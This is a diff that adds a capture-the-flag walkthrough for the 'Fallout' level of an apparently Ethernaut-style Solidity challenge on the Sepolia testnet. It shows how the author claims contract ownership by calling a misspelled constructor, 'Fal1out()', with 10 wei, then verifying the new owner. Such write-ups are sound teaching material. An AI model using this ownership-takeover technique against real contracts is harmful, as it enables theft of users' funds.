@@ -95,3 +95,38 @@ I'm the **owner** now so I can [withdraw](https://sepolia.etherscan.io/tx/0x7fb9
 ```
 
 [Submit](https://sepolia.etherscan.io/tx/0x12f7e4ff905d3609f595709d4296be0e6e607a9ac046bee183bb331567892131) level instance to finish.
+
+## 2. Fallout
+
+First, [create](https://sepolia.etherscan.io/tx/0xf42e581a626fcdf22ae841976fb88a591fd819671eb3fa95b28dcf052749f90f) the [level instance](https://sepolia.etherscan.io/address/0xaF2C39b2AD3E3b8a33B6eCD7D4A583DF064c4e50):
+
+> Claim ownership of the contract below to complete this level.
+> Things that might help:
+>
+> - Solidity Remix IDE
+
+Check who is the current **owner**:
+
+```js
+> await contract.owner()
+'0x0000000000000000000000000000000000000000'
+```
+
+This was an easy level because we can use the function marked as a **constructor** for the Smart Contract has a typo. It is `Fal1out()` instead of `Fallout()`.
+
+Let's simply [call](https://sepolia.etherscan.io/tx/0x27583e3d65e79684f1762306c9886b3cd2982073bf5ba8795b69df389b98bdb9) this function and send `10 wei` to become the **owner**:
+
+```js
+> await contract.Fal1out({value:"10"})
+
+{tx: '0x27583e3d65e79684f1762306c9886b3cd2982073bf5ba8795b69df389b98bdb9'}
+```
+
+Then, we can see we are the **owner**...
+
+```js
+> await contract.owner()
+'0xB8b74Dc6bce6B16dcd634aB94600a3c9967E6F0D'
+```
+
+[Submit](https://sepolia.etherscan.io/tx/0x942fb6c2348a5a78b41271fc4f1bd05e8b7b621700be40c94ed14c6c6caa46aa) level instance to finish.
